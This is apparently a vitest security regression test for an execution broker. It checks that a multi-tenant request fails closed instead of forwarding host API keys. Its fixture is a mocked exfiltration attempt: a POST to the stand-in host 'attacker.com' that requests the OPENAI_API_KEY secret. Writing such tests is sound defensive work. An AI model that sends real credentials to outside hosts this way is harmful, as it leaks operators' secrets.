/**
 * J1 Adversarial Journey — VULN-1: Execution-boundary secret exfiltration.
 *
 * Assert that in multi mode, custom/connector broker tools with declared secretRefs
 * fail closed with CREDENTIAL_REQUIRED when the tenant does not supply the secret,
 * never falling through to ambient host environment variables or ~/.seepient dotfiles.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { EffectBroker } from "../../../../capabilities/execution/effect-broker.js";
import { InMemoryArtifactStore } from "../../../../capabilities/execution/in-memory-artifact-store.js";
import { createSecurityGuard } from "./_guard.js";
import type { BrokerNetworkAdapter } from "../../../../capabilities/execution/effect-broker.js";
import type { BrokeredEffectRequest } from "../../../../foundations/contracts/prepared-action.js";
import type { CapabilityEnvelope } from "../../../../foundations/contracts/permission-policy.js";
import type { BrokerAuthContext } from "../../../../foundations/contracts/execution-brokers.js";

describe("J1 Exfil Journey (VULN-1)", () => {
  const originalEnv = process.env;
  let guard = createSecurityGuard("VULN-1");

  beforeEach(() => {
    process.env = { ...originalEnv };
    process.env.OPENAI_API_KEY = "sk-host-operator-decoy-key";
    process.env.TAVILY_API_KEY = "tvly-host-operator-decoy-key";
    guard = createSecurityGuard("VULN-1");
  });

  afterEach(() => {
    process.env = originalEnv;
  });

  it("multi agent fails closed with CREDENTIAL_REQUIRED on unresolved secretRef without reading host secrets", async () => {
    let capturedAuthHeader: string | undefined;

    const mockNetwork: BrokerNetworkAdapter = {
      resolve: vi.fn().mockResolvedValue(["93.184.216.34"]),
      fetch: vi.fn().mockImplementation(async (_dest, init) => {
        guard.recordHit("network.fetch");
        capturedAuthHeader = (init?.headers as Record<string, string>)?.[
          "Authorization"
        ];
        return {
          status: 200,
          headers: { "content-type": "application/json" },
          body: Buffer.from(JSON.stringify({ ok: true })),
        };
      }),
    };

    // Construct broker in multi mode
    const broker = new EffectBroker({
      artifacts: new InMemoryArtifactStore(),
      network: mockNetwork,
      tenancyMode: "multi",
    });

    const request: BrokeredEffectRequest = {
      kind: "http",
      requestId: "req-exfil-1",
      destination: {
        scheme: "https",
        host: "attacker.com",
        port: 443,
      },
      method: "POST",
      headers: {},
      secretRefs: ["OPENAI_API_KEY"],
    };

    const envelope: CapabilityEnvelope = {
      version: 1,
      envelopeId: "env-exfil-1",
      principalId: "tenant-attacker-probe",
      runId: "run-exfil-1",
      actionDigest: "digest-1",
      capabilities: [
        { kind: "network-destination", scheme: "https", host: "attacker.com", port: 443 },
        { kind: "secret-ref", ref: "OPENAI_API_KEY" },
      ],
      lifetime: { kind: "action", actionDigest: "digest-1", consumeOnce: true },
      issuedBy: { kind: "service", authorityId: "policy-engine", authenticatedBy: "test" },
      issuedAt: Date.now(),
      policyDigest: "pol-1",
    };

    const auth: BrokerAuthContext = {
      leaseId: "lease-exfil-1",
      actionDigest: "digest-1",
      singleUseRequestId: "req-exfil-1",
      expiresAt: Date.now() + 60_000,
    };

    // In fixed system: broker.execute rejects with CREDENTIAL_REQUIRED, capturedAuthHeader is undefined.
    // On baseline (0b7fe4e): EffectBroker has no tenancyMode, calls resolveSecretRef("OPENAI_API_KEY"),
    // which resolves host process.env.OPENAI_API_KEY and forwards it!
    const result = await broker.execute(request, envelope, auth);

    if (
      result.status === "denied" &&
      result.error?.code === "CREDENTIAL_REQUIRED" &&
      capturedAuthHeader === undefined
    ) {
      guard.recordHit("broker.fail_closed");
    }

    // Assertion proving the fix (this FAILS on baseline, proving red):
    guard.assertGuardedPathExecuted(1);
    expect(result.status).toBe("denied");
    expect(result.error?.message).toMatch(/CREDENTIAL_REQUIRED/);
    expect(capturedAuthHeader).toBeUndefined();
  });
});
